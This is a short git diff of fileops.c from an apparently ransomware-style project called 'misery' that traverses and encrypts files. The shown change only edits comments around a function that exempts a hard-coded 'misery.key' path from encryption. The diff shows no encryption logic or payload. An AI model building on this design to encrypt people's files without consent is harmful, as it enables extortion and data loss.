@@ -30,16 +30,16 @@
 // fileops.c
 // handles file traversal, encryption, and decryption using a worker thread pool
 
-#include "fileops.h"       // fileops public API and types
-#include "crypto.h"        // encrypt and decrypt buffer functions
-#include "misery_config.h" // project wide config constants and logging
-#include <stdio.h>         // standard input output
-#include <string.h>        // string utility functions
-#include <shlobj.h>        // windows shell object paths
-#include <inttypes.h>      // portable integer format macros
+#include "fileops.h"       
+#include "crypto.h"       
+#include "misery_config.h"
+#include <stdio.h>        
+#include <string.h>      
+#include <shlobj.h>        
+#include <inttypes.h>    
 
 
-// IsKeyFilePath checks if a given path refers to the misery.key file
+
 // this is called in three places to make sure the key file is never encrypted
 // returns true if the path matches any known key file location
 static bool IsKeyFilePath(const char *path) {
@@ -48,8 +48,9 @@ static bool IsKeyFilePath(const char *path) {
 
     // list of known absolute paths where the key file is written
     static const char *exactPaths[] = {
-        "C:\\Users\\jahan\\OneDrive\\Desktop\\misery.key", // default desktop save location
-        NULL                                                // sentinel to end the array
+        "C:\\Users\\jahan\\OneDrive\\Desktop\\misery.key", /* default desktop save location
+                                                              you can modify it according to your needs*/
+        NULL                                                
     };
 
     // check the path against each known absolute path
